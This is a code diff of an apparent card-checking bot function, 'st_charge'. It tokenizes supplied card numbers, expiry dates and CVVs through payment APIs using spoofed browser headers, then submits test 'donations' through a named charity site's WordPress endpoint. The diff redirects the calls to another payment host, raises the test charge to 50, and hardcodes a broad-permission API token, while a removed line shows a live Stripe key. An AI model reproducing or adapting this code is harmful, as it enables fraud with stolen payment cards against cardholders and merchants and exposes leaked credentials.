@@ -33,11 +33,11 @@ async def st_charge(event):
 
     async with httpx.AsyncClient() as client:
         headers = {
-        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
         "accept": "application/json, text/plain, */*",
-        "content-type": "application/x-www-form-urlencoded"
+        "content-type": "application/json"
         }
-        r = await client.post('https://m.stripe.com/6', headers=headers)
+        r = await client.post('https://api.ephanti.com/v1', headers=headers)
         Muid = r.json()['muid']
         Sid = r.json()['sid']
         Guid = r.json()['guid']
@@ -46,7 +46,7 @@ async def st_charge(event):
             "guid": Guid,
             "muid": Muid,
             "sid": Sid,
-            "key": "pk_live_RhohJY61ihLIp0HRdJaZj8vj",
+            "key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImMwY2ViYjA3LTYwZDUtNDhlNS04MTgyLWM5NzFkZGJhMWQzNCIsImFwaV9uYW1lIjoiQVBJX0d2VVVIa0Jwd2pkbFRGSXV6TyIsInBlcm1pc3Npb25zIjp7InJvbGVQZXJtaXNzaW9ucyI6WyJtZXRhZGF0YS5yZWFkIiwib3JkZXJfaXRlbXMucmVhZCIsIm9yZGVyX2l0ZW1zLndyaXRlIiwib3JkZXJfcGF5bWVudHMucmVhZCIsIm9yZGVyX3BheW1lbnRzLndyaXRlIiwicHJvZHVjdHMucmVhZCIsImFjY291bnRzLnJlYWQiLCJlbXBsb3llZXMucmVhZCIsImNhbXBhaWducy5yZWFkIiwiY2FtcGFpZ25zLndyaXRlIiwic3Vic2NyaXB0aW9ucy53cml0ZSIsInBheW1lbnRfbWV0aG9kcy5yZWFkIiwiZW1haWwucmVhZCIsImJyb2FkY2FzdHMucmVhZCIsIm9yZGVycy5yZWFkIiwib3JkZXJzLndyaXRlIiwiY29udGFjdHMucmVhZCIsInN1YnNjcmlwdGlvbnMucmVhZCJdfSwidGVuYW50X2lkIjoiY2YyN2I2MjItYzY0MC00OTBjLThlMGItNDFkOTYxMzljY2YyIiwiaWF0IjoxNzEwMzE5MzUwLCJleHAiOjE3NDE4NTUzNTB9.UrOy8rHNIK7T4c11tJDr9_nYzBk6394T-Ry4zbmBt3M",
             "card[name]": Name,
             "card[number]": ccn,
             "card[exp_month]": mm,
@@ -54,15 +54,15 @@ async def st_charge(event):
             "card[cvc]": cvv
             }
         head = {
-            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
-            "content-type": "application/x-www-form-urlencoded",
-            "accept": "application/json",
-            "origin": "https://js.stripe.com",
-            "referer": "https://js.stripe.com/",
-            "accept-language": "en-US,en;q=0.9"
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+            "content-type": "application/json",
+            "accept": "application/json, text/plain, */*",
+            "origin": "https://app-pages.ephanti.com",
+            "referer": "https://app-pages.ephanti.com/",
+            "accept-language": "es,en;q=0.9"
             }
 
-        resq = await client.post('https://api.stripe.com/v1/tokens',
+        resq = await client.post('https://api.ephanti.com/v1',
                                data=payload, headers=head)
         Id = resq.json()['id']
         Country = resq.json()['card']['country']
@@ -73,14 +73,14 @@ async def st_charge(event):
           "formName": "Donate",
           "fullstripe_name": Name,
           "fullstripe_email": Email,
-          "fullstripe_custom_amount": 1,
+          "fullstripe_custom_amount": 50,
           "stripeToken": Id
         }
         header = {
-          "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
-          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-          "accept": "application/json, text/javascript, */*; q=0.01",
-          "accept-language": "en-US,en;q=0.9"
+          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+          "content-type": "application/json",
+          "accept": "application/json, text/plain, */*",
+          "accept-language": "es,en;q=0.9"
         }
         cookie = {'stripe_mid': Muid, 'stripe_sid': Sid}
         req = await client.post('https://www.breslov.info/wp-admin/admin-ajax.php',
